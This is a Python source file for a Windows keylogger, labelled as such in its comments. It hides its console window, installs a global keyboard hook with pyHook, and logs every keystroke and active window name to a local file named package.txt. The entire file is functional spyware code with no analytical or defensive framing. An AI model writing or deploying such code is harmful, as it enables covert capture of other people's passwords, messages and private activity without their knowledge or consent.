import os
# Python code for keylogger
# to be used in windows
import win32api
import win32console
import win32gui
import pythoncom, pyHook
import atexit
import signal

win = win32console.GetConsoleWindow()
win32gui.ShowWindow(win, 0)



class tracker:
    pack = open("package.txt", "a")
    currentWindow = ""

    def OnKeyboardEvent(self, event):
        if self.currentWindow != event.WindowName:
            self.currentWindow = event.WindowName
            print("window changed to " +  event.WindowName)
            self.pack.write("\n window changed to " +  event.WindowName + "\n")
            self.pack.close()
            self.pack = open("package.txt", "a")
        print('MessageName:',event.MessageName)
        print('Message:',event.Message)
        print('Time:',event.Time)
        print('Window:',event.Window)
        print('WindowName:',event.WindowName)

        print('Key:', event.Key)

        self.pack.write(event.Key)
        self.pack.close()
        self.pack = open("package.txt", "a")


        return True

    def exit_handler(self):
        print('My application is ending!')
        self.pack.close()

hm = pyHook.HookManager()




#hook keyboard
newTracker = tracker()
hm.KeyDown = newTracker.OnKeyboardEvent # watch for all keyboard events
hm.HookKeyboard()

atexit.register(newTracker.exit_handler)
signal.signal(signal.SIGTERM, newTracker.exit_handler)
signal.signal(signal.SIGINT, newTracker.exit_handler)

pythoncom.PumpMessages()